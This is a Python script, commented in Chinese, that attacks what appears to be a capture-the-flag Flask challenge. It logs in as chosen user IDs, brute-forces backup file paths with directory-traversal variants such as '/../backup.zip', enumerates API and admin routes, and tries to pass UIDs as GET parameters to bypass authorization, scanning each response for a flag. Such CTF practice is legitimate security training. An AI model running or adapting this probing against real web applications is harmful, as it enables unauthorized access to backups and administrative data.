import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 最终尝试")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 用包含 "admin" 的用户登录后直接访问所有可能的备份文件
print("[*] 测试1: 系统性测试备份文件访问")

# 登录包含 "admin" 的用户
uid = "99803f00735243dab94fa2fd603e5330"  # adminuser
session.post(f"{BASE_URL}/login", data={"uid": uid})

# 全面测试备份文件
backup_tests = [
    # 直接文件
    "/backup.zip",
    "/backup.txt",
    "/backup",
    "/app.zip",
    "/app_backup.zip",
    # 不同目录
    "/static/backup.zip",
    "/static/backup.txt",
    "/static/backup",
    "/admin/backup.zip",
    "/admin/backup.txt",
    "/admin/backup",
    "/download/backup.zip",
    "/download/backup.txt",
    "/download/backup",
    # 目录遍历
    "/../backup.zip",
    "/../backup.txt",
    "/../backup",
    "/../app.zip",
    "/static/../backup.zip",
    "/static/../backup.txt",
    "/static/../backup",
    # 其他可能
    "/files/backup.zip",
    "/uploads/backup.zip",
    "/temp/backup.zip",
]

for path in backup_tests:
    resp = session.get(f"{BASE_URL}{path}")
    if resp.status_code != 404:
        print(f"    [+] {path}: {resp.status_code}")
        print(f"    {resp.text[:500]}")
        
        if "flag" in resp.text.lower() or "ctf" in resp.text.lower():
            print(f"    [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] Flag: {flag_match.group()}")

print()

# 测试2: 检查所有 API 路由是否有可访问的
print("[*] 测试2: 检查 API 路由")

api_routes = [
    "/api",
    "/api/",
    "/api/backup",
    "/api/admin",
    "/api/users",
    "/api/config",
    "/api/settings",
    "/api/admin/backup",
    "/api/admin/users",
]

for route in api_routes:
    # GET
    resp = session.get(f"{BASE_URL}{route}")
    if resp.status_code != 404 and resp.status_code != 405:
        print(f"    [+] GET {route}: {resp.status_code}")
        print(f"    {resp.text[:300]}")
        
        if "flag" in resp.text.lower():
            print(f"    [!!!] 发现 flag!")
    
    # POST
    resp = session.post(f"{BASE_URL}{route}")
    if resp.status_code != 404 and resp.status_code != 405:
        print(f"    [+] POST {route}: {resp.status_code}")
        print(f"    {resp.text[:300]}")
        
        if "flag" in resp.text.lower():
            print(f"    [!!!] 发现 flag!")

print()

# 测试3: 尝试用 GET 参数传递 UID
print("[*] 测试3: GET 参数传递 UID")

test_uids = [
    ("3553c1effa0b4698895a4874cfbd86d8", "ADMiN"),
    ("99803f00735243dab94fa2fd603e5330", "adminuser"),
]

for uid, name in test_uids:
    print(f"    [-] {name}: {uid}")
    
    # 尝试用 GET 参数访问 /api/admin
    resp = session.get(f"{BASE_URL}/api/admin", params={"uid": uid})
    if resp.status_code != 403:
        print(f"        [!] GET /api/admin?uid={uid}: {resp.status_code}")
        print(f"        {resp.text[:300]}")
        
        if "flag" in resp.text.lower():
            print(f"        [!!!] 发现 flag!")

print()

print("[*] 测试完成")
